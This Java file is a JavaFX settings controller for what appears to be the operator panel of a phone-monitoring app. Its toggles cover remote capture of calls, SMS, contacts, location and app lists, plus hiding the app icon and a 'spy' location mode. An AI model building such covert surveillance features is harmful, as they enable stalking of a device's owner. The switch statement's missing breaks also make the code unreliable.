package gui.fragment_controllers;

import com.jfoenix.controls.JFXCheckBox;
import com.jfoenix.controls.JFXRadioButton;
import dagger.Injector;
import dagger.application.AppModule;
import dagger.device_info.DeviceInfoModule;
import data.remote.model.information.Settings;
import gui.fragment_controllers.device_info.DeviceInfoController;
import io.datafx.controller.ViewController;
import io.datafx.controller.ViewNode;
import io.datafx.controller.flow.Flow;
import io.datafx.controller.flow.FlowHandler;
import io.datafx.controller.flow.context.FXMLViewFlowContext;
import io.datafx.controller.flow.context.ViewFlowContext;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Toggle;
import javafx.scene.control.ToggleGroup;
import javafx.scene.layout.StackPane;
import org.apache.log4j.Logger;

import javax.annotation.PostConstruct;
import javax.inject.Inject;
import java.util.Arrays;
import java.util.Objects;

/**
 * Created by oldman on 26.06.17.
 */

@ViewController(value = "/fxml/settings.fxml")
public class SettingsController {
    private static final Logger LOG = Logger.getLogger(SettingsController.class);
    @FXMLViewFlowContext
    ViewFlowContext context;
    @ViewNode
    private StackPane rootPane;
    @ViewNode
    private JFXCheckBox checkCall;
    @ViewNode
    private JFXCheckBox checkSMS;
    @ViewNode
    private JFXCheckBox checkLocation;
    @ViewNode
    private JFXCheckBox checkService;
    @ViewNode
    private JFXCheckBox checkContact;
    @ViewNode
    private JFXCheckBox checkCallList;
    @ViewNode
    private JFXCheckBox checkSmsList;
    @ViewNode
    private JFXCheckBox checkInstallApps;
    @ViewNode
    private JFXCheckBox checkHideIcon;
    @ViewNode
    private JFXCheckBox checkAirplaneMode;
    @ViewNode
    private JFXCheckBox checkWiFi;
    @ViewNode
    private JFXCheckBox checkScreen;
    @ViewNode
    private JFXCheckBox checkReboot;
    @ViewNode
    private JFXCheckBox checkShutDown;
    @ViewNode
    private JFXRadioButton rBtnHightAccuracyLocation;
    @ViewNode
    private JFXRadioButton rBtnMidleAccuracyLocation;
    @ViewNode
    private JFXRadioButton rBtnSpyLocation;
    private Settings settings;
    private DeviceInfoController deviceInfoController;
    Flow contentFlow;
    FlowHandler contentFlowHandler;
    @PostConstruct
    public void init() {
        Injector.inject(this, Arrays.asList( new AppModule()));
//        Objects.requireNonNull(context, "device");
//        contentFlowHandler = (FlowHandler) context.getRegisteredObject("ContentInnerFlowHandler");
//
//        contentFlow = (Flow) context.getRegisteredObject("ContentFlow");
    }

    public void init(DeviceInfoController deviceInfoController, Settings settings) {
        this.deviceInfoController = deviceInfoController;
        this.settings = settings;
        ToggleGroup group = new ToggleGroup();
        rBtnHightAccuracyLocation.setToggleGroup(group);
        rBtnMidleAccuracyLocation.setToggleGroup(group);
        rBtnSpyLocation.setToggleGroup(group);
        switch (settings.getLocationMode()) {
            case 0:
                rBtnHightAccuracyLocation.setSelected(true);
            case 1:
                rBtnMidleAccuracyLocation.setSelected(true);
            case 2:
                rBtnSpyLocation.setSelected(true);
        }
        checkCall.setSelected(settings.isBell());
        checkLocation.setSelected(settings.isLocation());
        checkService.setSelected(settings.isService());
        checkContact.setSelected(settings.isContactBook());
        checkCallList.setSelected(settings.isCallList());
        checkSmsList.setSelected(settings.isSmsList());
        checkInstallApps.setSelected(settings.isAppList());
        checkHideIcon.setSelected(settings.isHideIcon());
        checkAirplaneMode.setSelected(settings.isAirplaneMode());
        checkWiFi.setSelected(settings.isWifi());
        checkScreen.setSelected(settings.isScreen());
        checkReboot.setSelected(settings.isReboot());
        checkShutDown.setSelected(settings.isShutDown());
        group.selectedToggleProperty().addListener(new ChangeListener<Toggle>() {
            public void changed(ObservableValue<? extends Toggle> ov, Toggle old_toggle, Toggle new_toggle) {
                if (group.getSelectedToggle() != null) {
                    settings.setLocationMode(Integer.parseInt(group.getSelectedToggle().getUserData().toString()));
                }
            }
        });
    }

    @FXML
    void onAccept(ActionEvent event) {
        settings.setBell(checkCall.isSelected());
        settings.setSms(checkSMS.isSelected());
        settings.setLocation(checkLocation.isSelected());
        settings.setService(checkService.isSelected());
        settings.setContactBook(checkContact.isSelected());
        settings.setCallList(checkCallList.isSelected());
        settings.setSmsList(checkSmsList.isSelected());
        settings.setAppList(checkInstallApps.isSelected());
        settings.setHideIcon(checkHideIcon.isSelected());
        settings.setAirplaneMode(checkAirplaneMode.isSelected());
        settings.setWifi(checkWiFi.isSelected());
        settings.setScreen(checkScreen.isSelected());
        settings.setReboot(checkReboot.isSelected());
        settings.setShutDown(checkShutDown.isSelected());
        if (deviceInfoController != null)
            deviceInfoController.onSaveNewSettings(settings);
    }


    //
    @FXML
    void onDecline(ActionEvent event) {
        if(deviceInfoController != null)
            deviceInfoController.closeSettingsView(contentFlowHandler);
//        contentFlowHandler.destroy();
    }


}
